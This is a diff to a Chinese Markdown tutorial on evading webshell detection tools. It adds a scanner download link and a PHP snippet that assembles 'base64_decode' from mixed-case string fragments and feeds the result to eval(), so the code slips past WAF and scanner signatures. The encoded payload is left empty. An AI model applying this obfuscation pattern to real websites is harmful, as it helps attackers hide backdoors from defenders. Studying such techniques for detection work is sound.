@@ -16,6 +16,7 @@ WAF |  下载
  河马webshell查杀 |  http://dl.shellpub.com/hm-ui/latest/HmSetup.zip?version=1.5.0
 深信服WebShellKillerTool | http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip
 网站安全狗网马查杀 | http://download.safedog.cn/download/software/safedogwzApache.exe
+OpenRASP WEBDIR+检测引擎 | https://scanner.baidu.com
 
 ![2](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnshf8voj31400idwhz.jpg)
 ![3](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnsiq1zej314d0ijabt.jpg)
@@ -37,6 +38,14 @@ waf查杀:
 ![6](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qwqzgr9dj30lg06omxe.jpg)
 
 分割函数:
-
+我们把base64_decode大小写分割成多个变量，再合并，并赋值给其他变量。
+```
+<?php
+$a = 'bAsE';
+$b = '64_dEcODE';
+$c = $a.$b;
+$d = $c('');
+eval($d);
+```
 
 
